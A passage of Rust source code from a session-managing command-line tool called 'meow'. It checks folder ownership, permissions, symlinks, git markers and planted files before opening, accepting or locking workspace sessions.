        return (None, None);
    };
    let leads_here = |found: Option<PathBuf>| found.is_some_and(|found| same_dir(&found, dir));
    let named = validate_name(name).ok();
    let by_name = named.as_deref().is_some_and(|name| {
        leads_here(
            find_session(home, &cwd, name)
                .ok()
                .flatten()
                .and_then(|found| found.dir(home, name).ok()),
        )
    });
    let open = named.as_deref().and_then(|name| {
        if by_name {
            return Some(format!("meow {name}"));
        }
        let here = here_session(home, &cwd, name).and_then(|here| here.dir(home, name).ok());
        leads_here(here).then(|| format!("meow {name} --local"))
    });
    let delete = match named.as_deref() {
        Some(name) if by_name => Some(format!("meow delete {name}")),
        _ => leads_here(local_session_dir(home, &cwd, "").ok())
            .then(|| "meow delete --local".to_owned()),
    };
    (open, delete)
}

/// Whether `path` is the `.gitignore` meow writes into `./meow`, word for
/// word: one that says more could let git take in session data.
fn is_sessions_marker(path: &Path) -> bool {
    read_bounded(path, 4096).is_ok_and(|text| text == SESSIONS_MARKER_TEXT)
}

/// Why `./meow` of a folder cannot take a new session, if it cannot: it
/// must be missing, empty, or a folder meow made (it has the marker).
fn check_sessions_dir(sessions: &Path) -> Result<(), String> {
    let meta = match fs::symlink_metadata(sessions) {
        Ok(meta) => meta,
        Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(()),
        Err(error) => return Err(format!("cannot read ./{SESSIONS_DIR} there: {error}")),
    };
    if meta.file_type().is_symlink() {
        return Err(format!("./{SESSIONS_DIR} there is a link"));
    }
    if !meta.is_dir() {
        return Err(format!(
            "./{SESSIONS_DIR} there is a file, not meow's folder"
        ));
    }
    #[cfg(unix)]
    if verify_unix_owner_meta(&meta, sessions).is_err() {
        return Err(format!("./{SESSIONS_DIR} there belongs to another user"));
    }
    if is_sessions_marker(&sessions.join(SESSIONS_MARKER)) {
        return Ok(());
    }
    match fs::read_dir(sessions).map(|mut entries| entries.next().is_none()) {
        Ok(true) => Ok(()),
        Ok(false) => Err(format!(
            "./{SESSIONS_DIR} there holds other files, not meow's"
        )),
        Err(error) => Err(format!("cannot read ./{SESSIONS_DIR} there: {error}")),
    }
}

/// Makes `./meow` private and gives it meow's `.gitignore`, putting that
/// back when it was changed.
fn secure_sessions_dir(sessions: &Path) -> Result<()> {
    create_private_dir(sessions)?;
    let marker = sessions.join(SESSIONS_MARKER);
    if is_sessions_marker(&marker) {
        return Ok(());
    }
    write_marker(&marker)
}

/// Gives the session folder `dir` in `./meow` a `.gitignore` of its own
/// that keeps everything in it out of git: git reads the deepest one
/// last, so a `.gitignore` above that lets `./meow` in (a pull can bring
/// one) does not let the session in.
fn secure_session_dir(dir: &Path) -> Result<()> {
    let marker = dir.join(SESSIONS_MARKER);
    if is_sessions_marker(&marker) {
        return Ok(());
    }
    write_marker(&marker)
}

/// Writes meow's `.gitignore` at `marker`, in place of whatever is there.
fn write_marker(marker: &Path) -> Result<()> {
    match private_open_options()
        .write(true)
        .create_new(true)
        .open(marker)
    {
        Ok(mut file) => file
            .write_all(SESSIONS_MARKER_TEXT.as_bytes())
            .with_context(|| format!("cannot write {}", marker.display())),
        Err(error) if error.kind() == io::ErrorKind::AlreadyExists => {
            write_private_atomic(marker, SESSIONS_MARKER_TEXT.as_bytes())
        }
        Err(error) => Err(error).with_context(|| format!("cannot create {}", marker.display())),
    }
}

/// Makes `<folder>/meow` ready for a new session, so a folder meow cannot
/// write to is found out before anything else is made.
pub fn prepare_sessions_dir(folder: &Path) -> Result<()> {
    secure_sessions_dir(&sessions_dir(folder))
}

/// Removes `./meow` once only its `.gitignore` is left in it.
fn remove_if_only_marker(sessions: &Path) {
    if fs::symlink_metadata(sessions).map_or(true, |meta| !meta.is_dir()) {
        return;
    }
    let Ok(entries) = fs::read_dir(sessions) else {
        return;
    };
    let names: Vec<OsString> = entries.flatten().take(2).map(|e| e.file_name()).collect();
    let marker = sessions.join(SESSIONS_MARKER);
    if names == [OsString::from(SESSIONS_MARKER)] && is_sessions_marker(&marker) {
        let _ = fs::remove_file(&marker);
        let _ = fs::remove_dir(sessions);
    }
}

/// The effective user and group of this process.
#[cfg(unix)]
fn effective_ids() -> (u32, u32) {
    // SAFETY: these calls have no preconditions and cannot fail.
    unsafe { (libc::geteuid(), libc::getegid()) }
}

/// The folders above `folder`, as its path names them and as they really
/// are once links are resolved. Missing ones are left out of the second.
fn folders_above(folder: &Path) -> Vec<PathBuf> {
    let mut above: Vec<PathBuf> = folder.ancestors().skip(1).map(Path::to_path_buf).collect();
    let real = match fs::canonicalize(folder) {
        Ok(real) => real.parent().map(Path::to_path_buf),
        Err(_) => folder
            .ancestors()
            .skip(1)
            .find_map(|path| fs::canonicalize(path).ok()),
    };
    if let Some(real) = real {
        above.extend(real.ancestors().map(Path::to_path_buf));
    }
    above
}

/// Why another account could change a folder, in a few words, and what
/// the user can do about it.
#[cfg(unix)]
#[derive(Debug, PartialEq, Eq)]
struct Unsafe {
    reason: String,
    fix: String,
}

#[cfg(unix)]
impl Unsafe {
    /// One the user fixes by making the folder theirs alone.
    fn mine(reason: impl Into<String>) -> Self {
        Self {
            reason: reason.into(),
            fix: "Make that folder yours alone".into(),
        }
    }

    /// Why others could change `path`, said as `what`.
    fn of(why: crate::perms::Why, what: &str, path: &Path) -> Self {
        use crate::perms::Why;
        let fix = match why {
            Why::Others | Why::Group => return Self::mine(why.says(what)),
            Why::GroupUnknown(_) => format!("Remove group write from {}", path.display()),
            // Nothing of the user's own tells who may write there.
            Why::Hidden(_) => "Move that folder to a disk of this computer".into(),
            Why::Unreadable => format!("Check the access list of {}", path.display()),
        };
        Self {
            reason: why.says(what),
            fix,
        }
    }
}

/// Why another account could swap what is in `folder` through a folder
/// above it: one that belongs to another user (root aside), or one other
/// users can write to (through a shared group or an access list too)
/// without the sticky bit `/tmp` has.
#[cfg(unix)]
fn unsafe_folder_above(folder: &Path) -> Option<Unsafe> {
    use std::os::unix::fs::MetadataExt;
    let (me, _) = effective_ids();
    for path in folders_above(folder) {
        let Ok(meta) = fs::metadata(&path) else {
            continue;
        };
        if meta.uid() != 0 && meta.uid() != me {
            return Some(Unsafe::mine("a folder above it belongs to another user"));
        }
        if meta.mode() & 0o1000 == 0 {
            if let Some(why) = crate::perms::why_others_can_change(&path, &meta) {
                return Some(Unsafe::of(why, "a folder above it", &path));
            }
        }
    }
    None
}

/// Why another account could change `folder` itself, as its path names it
/// and as it really is once links are resolved: it belongs to another
/// user, or others can write to it. `None` for one that does not exist yet.
#[cfg(unix)]
fn unsafe_folder(folder: &Path) -> Option<Unsafe> {
    let real = fs::canonicalize(folder).ok();
    for path in std::iter::once(folder).chain(real.as_deref()) {
        match fs::metadata(path) {
            // A new session's folder may not be made yet.
            Err(error) if error.kind() == io::ErrorKind::NotFound => {}
            Err(error) => return Some(Unsafe::mine(format!("cannot read it: {error}"))),
            Ok(meta) if verify_unix_owner_meta(&meta, path).is_err() => {
                return Some(Unsafe::mine("it belongs to another user"))
            }
            Ok(meta) => {
                if let Some(why) = crate::perms::why_others_can_change(path, &meta) {
                    return Some(Unsafe::of(why, "it", folder));
                }
            }
        }
    }
    None
}

/// Why meow cannot use a folder whose path is not text (UTF-8): the
/// record of the user's sessions, and the shell start-up files, name it.
fn not_text(path: &Path) -> Option<&'static str> {
    path.to_str()
        .is_none()
        .then_some("the path is not valid UTF-8")
}

/// The folder that holds the session in `dir`: `<folder>` of
/// `<folder>/meow/<name>` or of an old `<folder>/.meow`. `None` for one in
/// `~/.meow/workspaces`.
fn holding_folder(dir: &Path) -> Option<&Path> {
    if folder_session(dir).is_some() {
        return dir.parent()?.parent();
    }
    (dir.file_name() == Some(LOCAL_DIR.as_ref()))
        .then(|| dir.parent())
        .flatten()
}

/// Why the folder that holds the existing session in `dir` cannot hold it
/// any more, if it cannot: it, or one above it, is another user's, or
/// another account could rename what is in it and put its own files there
/// (see [`check_new_folder`]). Checked whenever a session is opened, used
/// by a helper or deleted, not only when it was made: a folder's
/// permissions can change after that.
fn check_session_place(dir: &Path) -> Result<()> {
    let Some(folder) = holding_folder(dir) else {
        return Ok(());
    };
    #[cfg(unix)]
    if let Some(Unsafe { reason, fix }) =
        unsafe_folder_above(folder).or_else(|| unsafe_folder(folder))
    {
        bail!(
            "Not using the session in {}: {reason}. {fix}, or delete {} yourself",
            folder.display(),
            dir.display()
        );
    }
    // Windows: the folders' access lists are not read here (see SECURITY.md).
    #[cfg(not(unix))]
    let _ = folder;
    Ok(())
}

/// Whether `path` is a session folder, or a `./meow` that holds sessions.
/// Nothing new goes inside one: deleting it would take the new one too.
fn is_session_place(path: &Path) -> bool {
    let named = |name: &str| path.file_name() == Some(name.as_ref());
    if named(SESSIONS_DIR) {
        return is_sessions_marker(&path.join(SESSIONS_MARKER)) || !sessions_in(path).is_empty();
    }
    has_profile(path)
        && (named(LOCAL_DIR)
            || path
                .parent()
                .is_some_and(|parent| parent.file_name() == Some(SESSIONS_DIR.as_ref())))
}

/// Whether a path holds text like `@HOOKS@`. The shell start-up files meow
/// writes are filled in by replacing such words one after another, so a
/// folder named with one could put its own commands in them.
fn has_placeholder(path: &Path) -> bool {
    let text = path.to_string_lossy();
    let parts: Vec<&str> = text.split('@').collect();
    parts.len() > 2
        && parts[1..parts.len() - 1].iter().any(|part| {
            !part.is_empty()
                && part
                    .chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
        })
}

/// Why `folder` cannot hold a new session `name`, in a few words. A folder
/// that does not exist yet passes the checks that need it to exist.
pub fn check_new_folder(home: &MeowHome, folder: &Path, name: &str) -> Result<(), String> {
    if let Some(reason) = not_text(folder) {
        return Err(reason.into());
    }
    if folder.to_string_lossy().chars().any(char::is_control) {
        return Err("the path has control characters".into());
    }
    if has_placeholder(folder) {
        return Err("the path has text like @NAME@, which meow cannot use".into());
    }
    if !folder.is_absolute() {
        return Err("the path is not absolute".into());
    }
    let real = |path: &Path| fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    let target = real(folder);
    if folder.parent().is_none() || target.parent().is_none() {
        return Err("that is the root of the disk".into());
    }
    let base = real(home.root());
    let sessions = sessions_dir(folder);
    if target.starts_with(&base)
        || folder.starts_with(home.root())
        || real(&sessions) == base
        || sessions == home.root()
    {
        return Err("that is inside meow's own data folder".into());
    }
    let mut along = folders_above(folder);
    along.extend([folder.to_path_buf(), target]);
    if along.iter().any(|path| is_session_place(path)) {
        return Err("that is inside a meow session folder".into());
    }
    #[cfg(unix)]
    if let Some(unsafe_above) = unsafe_folder_above(folder) {
        return Err(unsafe_above.reason);
    }
    match fs::metadata(folder) {
        Err(error) if error.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(error) => Err(format!("cannot read it: {error}")),
        Ok(meta) if !meta.is_dir() => Err("that is a file, not a folder".into()),
        Ok(_) => {
            #[cfg(unix)]
            if let Some(unsafe_here) = unsafe_folder(folder) {
                return Err(unsafe_here.reason);
            }
            check_sessions_dir(&sessions)?;
            if fs::symlink_metadata(sessions.join(name)).is_ok() {
                return Err(format!("./{SESSIONS_DIR}/{name} already exists there"));
            }
            Ok(())
        }
    }
}

/// Whether the path looks like a folder a cloud service keeps in sync.
pub fn looks_cloud_synced(folder: &Path) -> bool {
    let text = folder.to_string_lossy().replace('\\', "/");
    CLOUD_FOLDERS.iter().any(|part| text.contains(part))
}

/// The folder an answer names: `~` and `~/x` start at `user_home`, a
/// relative path at `cwd`. Surrounding spaces are ignored; `.` and `..`
/// are resolved by name.
pub fn folder_from_answer(
    cwd: &Path,
    answer: &str,
    user_home: Option<&Path>,
) -> Result<PathBuf, String> {
    let answer = answer.trim();
    if answer.is_empty() {
        return Err("type a folder".into());
    }
    let tilde_rest = if answer == "~" {
        Some("")
    } else {
        answer
            .strip_prefix("~/")
            .or_else(|| answer.strip_prefix("~\\").filter(|_| cfg!(windows)))
    };
    let path = match tilde_rest {
        Some(rest) => user_home.ok_or("cannot find your home folder")?.join(rest),
        None => cwd.join(answer),
    };
    let mut clean = PathBuf::new();
    for part in path.components() {
        match part {
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                clean.pop();
            }
            other => clean.push(other),
        }
    }
    if !clean.is_absolute() {
        return Err("the path is not absolute".into());
    }
    Ok(clean)
}

/// Creates a folder the user asked for (and missing parents), private.
pub fn create_folder(folder: &Path) -> io::Result<()> {
    let mut builder = fs::DirBuilder::new();
    builder.recursive(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        builder.mode(0o700);
    }
    builder.create(folder)
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Workspace {
    pub name: String,
    /// Absolute workspace directory.
    pub dir: PathBuf,
    pub local: bool,
    pub profile: Profile,
}

impl Workspace {
    /// [`Workspace::open_at`] for callers that choose by flag: `local` is
    /// `--local` ([`local_location`]), otherwise `~/.meow/workspaces/<name>`.
    pub fn open_or_create(
        home: &MeowHome,
        cwd: &Path,
        name: &str,
        local: bool,
        default_mode: Mode,
    ) -> Result<(Self, bool)> {
        let location = if local {
            local_location(home, cwd, name)?
        } else {
            Location::Home
        };
        Self::open_at(home, &location, name, default_mode)
    }

    /// Creates or resumes the session `name` at `location` and re-applies
    /// its permissions. Returns `true` when it was newly created. An
    /// existing `profile.toml` is read but not rewritten; see
    /// [`Workspace::record_open`]. A session outside `~/.meow` that this
    /// user did not make is opened untouched, to be accepted or refused.
    pub fn open_at(
        home: &MeowHome,
        location: &Location,
        name: &str,
        default_mode: Mode,
    ) -> Result<(Self, bool)> {
        let name = checked_name(name)?;
        let dir = location.dir(home, &name)?;
        if let Some(reason) = not_text(&dir) {
            bail!("Not using {}: {reason}", dir.display());
        }
        if has_placeholder(&dir) {
            bail!(
                "{} has text like @NAME@ in its path, which meow cannot use",
                dir.display()
            );
        }
        check_session_place(&dir)?;
        let sessions = match location {
            Location::Home => {
                create_private_dir(home.root())?;
                create_private_dir(&home.workspaces_dir())?;
                None
            }
            Location::Folder(_) => {
                let sessions = dir.parent().map(Path::to_path_buf);
                if let Some(sessions) = &sessions {
                    refuse_symlink(sessions)?;
                }
                sessions
            }
            Location::Legacy(_) => None,
        };
        let local = !matches!(location, Location::Home);
        refuse_symlink(&dir)?;
        refuse_links_inside(&dir)?;

        let profile_path = dir.join(PROFILE_FILE);
        let existed = fs::symlink_metadata(&profile_path).is_ok_and(|meta| meta.is_file());
        if let (false, Some(sessions)) = (existed, &sessions) {
            check_sessions_dir(sessions)
                .map_err(|reason| anyhow!("cannot save in {}: {reason}", sessions.display()))?;
        }

        let mut profile = if existed {
            Profile::read(&profile_path)?
        } else {
            Profile {
                name: name.clone(),
                mode: default_mode,
                recon: PresetOverride::default(),
                // A new session outside ~/.meow is this user's own from the start.
                id: if local { Some(new_mark()?) } else { None },
            }
        };
        let unaccepted_foreign = existed && local && !is_own_at(home, &profile, &dir);
        if !unaccepted_foreign {
            if let Some(sessions) = &sessions {
                secure_sessions_dir(sessions)?;
                exclude_from_git(sessions);
            }
            create_private_dir(&dir)?;
            if sessions.is_some() {
                secure_session_dir(&dir)?;
            }
            create_private_subdir(&dir.join("tmp"))?;
            create_private_subdir(&dir.join("chats"))?;
            enforce_private_tree(&dir)
                .with_context(|| format!("cannot restrict permissions under {}", dir.display()))?;
            profile.name = name.clone();
        }
        if let (false, Some(mark)) = (unaccepted_foreign, &profile.id) {
            // New, or the user's own where it was recorded.
            remember(home, mark, sessions.as_ref().map(|_| dir.as_path()))?;
        }

        let workspace = Self {
            name,
            dir,
            local,
            profile,
        };
        if !existed {
            workspace.save_profile()?;
        }
        Ok((workspace, !existed))
    }

    /// True for any workspace outside `home.workspaces_dir()` that this user
    /// neither made nor accepted where it is (a `./meow/<name>` or `./.meow`
    /// that came with a folder, a copied or moved one, or an arbitrary
    /// directory passed via `$MEOW_WORKSPACE`).
    pub fn is_foreign(&self, home: &MeowHome) -> bool {
        !home.is_saved_workspace_dir(&self.dir) && !is_own_at(home, &self.profile, &self.dir)
    }

    /// Fails for a workspace that is not this user's, saying how to review
    /// or remove it from `cwd`. Helper commands call this before touching it.
    pub fn ensure_own(&self, home: &MeowHome, cwd: &Path) -> Result<()> {
        check_session_place(&self.dir)?;
        if self.is_foreign(home) {
            let (open, delete) = commands_for(home, cwd, &self.dir, &self.name);
            if let Some(old) = self.moved_from(home) {
                let open = open.map_or_else(
                    || "meow in that folder".to_owned(),
                    |open| format!("`{open}`"),
                );
                bail!(
                    "{} was moved from {}. Open it with {open} first",
                    self.dir.display(),
                    old.display()
                );
            }
            let what = match (open, delete) {
                (Some(open), Some(delete)) => format!(
                    "Review and accept it with `{open}` in a terminal, or remove it with `{delete}`"
                ),
                (Some(open), None) => format!(
                    "Review and accept it with `{open}` in a terminal, or delete that folder"
                ),
                (None, Some(delete)) => format!("Remove it with `{delete}`"),
                (None, None) => "Delete that folder if you do not want it".to_owned(),
            };
            bail!(
                "{} is a meow session from elsewhere: it came with this folder, \
                 or the folder was moved or copied. {what}",
                self.dir.display()
            );
        }
        // While its session runs, the session itself checked them; while a
        // helper writes them alone, that helper did ([`Workspace::write_alone`]).
        if !crate::lock::SessionLock::is_held(&self.lock_path())
            && !crate::lock::HelperLock::is_held(&self.helper_lock_path())
        {
            self.ensure_files_as_left(home, cwd)?;
        }
        enforce_private_tree(&self.dir)
            .with_context(|| format!("cannot restrict permissions under {}", self.dir.display()))?;
        Ok(())
    }

    /// Fails when files meow reads back from this session changed outside
    /// meow ([`Workspace::files_changed`]): only opening it takes them in.
    fn ensure_files_as_left(&self, home: &MeowHome, cwd: &Path) -> Result<()> {
        if self.files_changed(home) {
            let open = commands_for(home, cwd, &self.dir, &self.name)
                .0
                .map_or_else(|| "it".to_owned(), |open| format!("it with `{open}`"));
            bail!(
                "Files in {} changed outside meow (a git pull or an unpacked archive?). \
                 Open {open} first",
                self.dir.display()
            );
        }
        Ok(())
    }

    /// For a helper command (`command`, as `meow add`) that writes this
    /// session's files itself while no session runs: the helper lock, to be
    /// held until the files are recorded ([`SessionFiles::for_helper`]), so
    /// that no session starts meanwhile and no other such helper writes at
    /// the same time. `None` while a session holds the session lock: the
    /// command goes through that session. Waits a few seconds for another
    /// helper, then fails with its name; fails too when the files changed
    /// outside meow.
    pub fn write_alone(
        &self,
        home: &MeowHome,
        cwd: &Path,
        command: &str,
    ) -> Result<Option<crate::lock::HelperLock>> {
        use crate::lock::{HelperLock, LockError, SessionLock};
        let path = self.helper_lock_path();
        let lock = match HelperLock::acquire(&path, command, HELPER_WAIT) {
            Ok(lock) => lock,
            Err(LockError::Held { .. }) => bail!(self.helper_busy()),
            Err(LockError::Io(error)) => {
                return Err(anyhow!(error).context(format!("cannot lock {}", path.display())))
            }
        };
        if SessionLock::is_held(&self.lock_path()) {
            return Ok(None);
        }
        self.ensure_files_as_left(home, cwd)?;
        Ok(Some(lock))
    }

    /// For a session that starts: waits a few seconds for a helper that
    /// writes its files alone ([`Workspace::write_alone`]), then fails with
    /// its name. Call it holding the session lock.
    pub fn wait_for_helpers(&self) -> Result<()> {
        use crate::lock::{HelperLock, LockError};
        let path = self.helper_lock_path();
        match HelperLock::wait_free(&path, HELPER_WAIT) {
            Ok(()) => Ok(()),
            Err(LockError::Held { .. }) => bail!(self.helper_busy()),
            Err(LockError::Io(error)) => {
                Err(anyhow!(error).context(format!("cannot check {}", path.display())))
            }
        }
    }

    /// Who holds the helper lock, as said to the user.
    fn helper_busy(&self) -> String {
        helper_busy(&self.helper_lock_path(), &self.name)
    }

    /// Fails when another session of this user's already has this one's
    /// name: a name is one session wherever meow runs, so one that came
    /// with a folder cannot take it.
    pub fn check_name_free(&self, home: &MeowHome) -> Result<()> {
        let Some(own) = own_elsewhere(home, &self.name) else {
            return Ok(());
        };
        let dir = own.dir(home, &self.name)?;
        if !same_dir(&dir, &self.dir) {
            bail!(
                "You already have a session named '{}' at {}. Delete one of the two, \
                 or rename this one's folder",
                self.name,
                dir.display()
            );
        }
        Ok(())
    }

    /// Accepts a session that came with a folder as this user's own. Its
    /// stored mode is replaced by `mode` (the user's default), its recorded
    /// `last_cwd` is discarded, and private permissions are enforced.
    /// Refused when the user already has a session of that name.
    pub fn adopt(&mut self, home: &MeowHome, mode: Mode) -> Result<()> {
        self.check_name_free(home)?;
        self.secure()?;
        // A planted history could put a dangerous command one up-arrow away.
        self.drop_carried_files();
        let mark = new_mark()?;
        self.profile.id = Some(mark.clone());
        self.profile.mode = mode;
        self.save_profile()?;
        let in_sessions_dir = folder_session(&self.dir).is_some();
        remember(home, &mark, in_sessions_dir.then_some(self.dir.as_path()))
    }

    /// Makes a session taken in from a folder private, as a new one is:
    /// what [`Workspace::open_at`] leaves alone for one not yet accepted.
    fn secure(&self) -> Result<()> {
        let in_sessions_dir = folder_session(&self.dir).is_some();
        if let (true, Some(sessions)) = (in_sessions_dir, self.dir.parent()) {
            secure_sessions_dir(sessions)?;
            exclude_from_git(sessions);
        }
        refuse_symlink(&self.dir)?;
        refuse_links_inside(&self.dir)?;
        create_private_dir(&self.dir)?;
        if in_sessions_dir {
            secure_session_dir(&self.dir)?;
        }
        create_private_subdir(&self.tmp_dir())?;
        create_private_subdir(&self.chats_dir())?;
        enforce_private_tree(&self.dir)
            .with_context(|| format!("cannot restrict permissions under {}", self.dir.display()))
    }

    /// Records that a session now owns this workspace: stores the name it was
    /// opened as and marks activity. Call only while holding the session
    /// lock, so a refused second `meow <name>` never alters a live session.
    pub fn record_open(&mut self) -> Result<()> {
        // Re-read under the lock: a helper may have changed the profile
        // since `open_or_create` loaded it.
        let name = self.name.clone();
        self.profile = Profile::read(&self.profile_path())?;
        self.profile.name = name;
        self.save_profile()
    }

    /// Loads an existing workspace for a helper subcommand and re-applies
    /// permissions on saved global workspaces (local workspaces are
    /// re-permissioned in `ensure_own` after ownership is verified).
    pub fn load(dir: &Path) -> Result<Self> {
        let dir = std::path::absolute(dir)
            .with_context(|| format!("cannot resolve {}", dir.display()))?;
        if let Some(reason) = not_text(&dir) {
            bail!("Not using {}: {reason}", dir.display());
        }
        if let (Some(_), Some(sessions)) = (folder_session(&dir), dir.parent()) {
            // `./meow` is never a link either.
            refuse_symlink(sessions)?;
        }
        refuse_symlink(&dir)?;
        refuse_links_inside(&dir)?;
        let profile_path = dir.join(PROFILE_FILE);
        if !fs::symlink_metadata(&profile_path).is_ok_and(|meta| meta.is_file()) {
            bail!("no meow workspace at {}", dir.display());
        }
        let local = dir.file_name() == Some(LOCAL_DIR.as_ref()) || folder_session(&dir).is_some();
        let in_workspaces_dir = dir
            .parent()
            .and_then(|p| p.file_name())
            .is_some_and(|n| n == "workspaces");
        if !local && in_workspaces_dir {
            enforce_private_tree(&dir)
                .with_context(|| format!("cannot restrict permissions under {}", dir.display()))?;
        }
        let profile = Profile::read(&profile_path)?;
        // A session in `./meow` is called by its folder's name, whatever
        // the profile someone else wrote says.
        let name = match validate_name(&profile.name) {
            Ok(name) if folder_session(&dir).is_none() => name,
            _ => dir_name(&dir),
        };
        Ok(Self {
            name,
            dir,
            local,
            profile,
        })
    }

    pub fn set_mode(&mut self, mode: Mode) -> Result<()> {
        self.profile.mode = mode;
        self.save_profile()
    }

    fn save_profile(&self) -> Result<()> {
        let text = toml::to_string(&self.profile).context("cannot serialize profile.toml")?;
        write_private_atomic(&self.profile_path(), text.as_bytes())
    }

    pub fn profile_path(&self) -> PathBuf {
        self.dir.join(PROFILE_FILE)
    }

    pub fn lock_path(&self) -> PathBuf {
        self.dir.join(LOCK_FILE)
    }

    pub fn helper_lock_path(&self) -> PathBuf {
        self.dir.join(HELPER_LOCK_FILE)
    }

    pub fn replay_path(&self) -> PathBuf {
        self.dir.join("replay.sh")
    }

    pub fn state_db_path(&self) -> PathBuf {
        self.dir.join("state.db")
    }

    pub fn graph_path(&self) -> PathBuf {
        self.dir.join("graph.json")
    }

    pub fn runtime_path(&self) -> PathBuf {
        self.dir.join(RUNTIME_FILE)
    }

    /// Removes what a session that was killed left behind: its
    /// `runtime.json` and the page `meow map` wrote, both with its token.
    /// Called by a new session as soon as it holds the lock, so helpers do
    /// not take the old port for the new session while it starts.
    pub fn forget_last_session(&self) {
        let _ = fs::remove_file(self.runtime_path());
        let _ = fs::remove_file(self.tmp_dir().join(crate::webui::OPENER_FILE));
    }

    pub fn tmp_dir(&self) -> PathBuf {
        self.dir.join("tmp")
    }

    pub fn chats_dir(&self) -> PathBuf {
        self.dir.join("chats")
    }

    pub fn last_cwd_path(&self) -> PathBuf {
        self.dir.join("last_cwd")
    }

    /// The history file of the session shell `shell`, one of
    /// [`HISTORY_SHELLS`].
    pub fn history_path(&self, shell: &str) -> PathBuf {
        self.dir.join(format!("{shell}_history"))
    }

    /// The directory the previous session ended in, if it was recorded as a
    /// local absolute directory path and still exists.
    pub fn restored_cwd(&self) -> Option<PathBuf> {
        let text = read_bounded(&self.last_cwd_path(), LAST_CWD_MAX).ok()?;
        // Windows PowerShell may prepend a byte-order mark.
        let text = text
            .trim_start_matches('\u{feff}')
            .trim_end_matches(['\r', '\n']);
        if text.starts_with(r"\\") && !text.starts_with(r"\\?\") {
            return None;
        }
        let dir = PathBuf::from(text);
        if !is_local_absolute_dir_path(&dir) {
            return None;
        }
        dir.is_dir().then_some(dir)
    }

    /// Variables exported into the session shell so helper subcommands can
    /// find the session from any directory.
    pub fn session_env(&self) -> Vec<(String, OsString)> {
        vec![
            (SESSION_ENV.to_owned(), self.name.clone().into()),
            (WORKSPACE_ENV.to_owned(), self.dir.clone().into()),
            (MODE_ENV.to_owned(), self.profile.mode.as_str().into()),
        ]
    }
}

// ---------------------------------------------------------------------------
// How meow left a session's files
// ---------------------------------------------------------------------------

/// The files of a session meow reads back, which a `git pull` or `git
/// checkout` in the folder that holds `./meow` replaces without a word (git
/// treats ignored files as expendable), as an unpacked archive does: a
/// command one up-arrow away, the folder the shell starts in, queued scans,
/// hosts and findings. Chats (`chats/*`) count too.
const READ_BACK: &[&str] = &[
    "zsh_history",
    "bash_history",
    "powershell_history",
    "last_cwd",
    "replay.sh",
    "graph.json",
    "state.db",
    "state.db-wal",
    "state.db-journal",
];
/// Of those, the ones meow and the shell hooks only ever change in place,
/// so they keep their place on disk while a session runs.
const CHANGED_IN_PLACE: &[&str] = &["state.db", "replay.sh", "last_cwd"];
/// The folder in `~/.meow` that keeps, for each session mark, how meow
/// left that session's files.
const SEEN_DIR: &str = "session-files";
const SEEN_HEADER: &str = "meow session files 2";
const SEEN_MAX: u64 = 4 * 1024 * 1024;

/// Which file it is (its number on the device, and when it was made, 0
/// where the file system does not say: a number can be given to a new
/// file as soon as the old one is gone), its size, and when it was last
/// written. On Windows the number is the volume's serial number and the
/// file's index on it. NTFS gives an index to no later file; FAT and
/// exFAT make it from where the file's entry lies in its folder, which a
/// file made in that place gets again, and a network share passes on
/// whatever its server numbers files by. It is 0 where the file system
/// has no such number or does not tell it, and [`NO_NUMBER`] for a file
/// that could not be asked.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct FileId {
    ino: u128,
    born: i128,
    size: u64,
    written: i128,
}

/// Windows: the number of a file that is seen in its folder but cannot be
/// opened to ask for its number. It is no file's (a real one is a 32-bit
/// serial number and a 64-bit index) and fits the record of a session.
const NO_NUMBER: u128 = 1 << 100;

impl FileId {
    /// Whether `now` is this file as meow left it: the same size and last
    /// write and, where the file system tells, made at the same time. A
    /// file put in its place (a pull, an unpacked archive) is made and
    /// written later. Device and file numbers are not compared: a remount
    /// (an overlay after a container restart, NFS, FUSE, a FAT drive) can
    /// change them for the same file.
    fn unchanged(&self, now: &FileId) -> bool {
        self.size == now.size
            && self.written == now.written
            && (self.born == 0 || now.born == 0 || self.born == now.born)
    }

    /// Whether `now` is still the same file on disk, written since or
    /// not: made at the same time where the file system tells, else with
    /// the same number. Only used within one session.
    fn same_file(&self, now: &FileId) -> bool {
        self.same_file_where(now, cfg!(windows))
    }

    /// [`FileId::same_file`]. `by_number` is how Windows tells: a file made
    /// under the name of one deleted or renamed away seconds before is
    /// given the time that one was made at (file system tunneling), so a
    /// file put in place of another looks as old as it. On NTFS its number
    /// is its own, so there a file must have the same number wherever it
    /// has one. The number alone does not make it the same file: other
    /// file systems give a number again (FAT, exFAT, a share of a Unix
    /// server), so a file with the same number that was made at another
    /// time is another file. A file with a number at one end of the
    /// session only, or one that could not be asked for its number, is
    /// never taken as the same. Where no number is told at all, the rule
    /// above is all there is.
    fn same_file_where(&self, now: &FileId, by_number: bool) -> bool {
        if by_number && (self.ino != 0 || now.ino != 0) {
            self.ino == now.ino
                && self.ino != NO_NUMBER
                && (self.born == 0 || now.born == 0 || self.born == now.born)
        } else if self.born != 0 && now.born != 0 {
            self.born == now.born
        } else {
            self.ino == now.ino
        }
    }
}

/// Nanoseconds since 1970 of `at`; 0 when the file system does not say.
fn nanos(at: io::Result<SystemTime>) -> i128 {
    at.ok()
        .and_then(|at| at.duration_since(SystemTime::UNIX_EPOCH).ok())
        .and_then(|since| i128::try_from(since.as_nanos()).ok())
        .unwrap_or(0)
}

/// The [`FileId`] of the file at `path`, which `meta` was just read of.
/// Fails where the file cannot be told any more: with `NotFound` when it
/// is gone, with another error when something else stands in its place.
#[cfg(unix)]
fn file_id(_path: &Path, meta: &fs::Metadata) -> io::Result<FileId> {
    use std::os::unix::fs::MetadataExt;
    Ok(FileId {
        ino: u128::from(meta.ino()),
        born: nanos(meta.created()),
        size: meta.len(),
        written: i128::from(meta.mtime()) * 1_000_000_000 + i128::from(meta.mtime_nsec()),
    })
}

/// Windows tells a file's number through an open handle only. The file is
/// opened for no access to what it holds, so nobody's use of it is in the
/// way, and as itself, never as what a link put in its place points to;
/// the handle is closed again at once. A file that is seen in its folder
/// but cannot be opened (one being deleted) gets [`NO_NUMBER`]; one whose
/// file system tells no number, or none but 0, gets 0.
#[cfg(windows)]
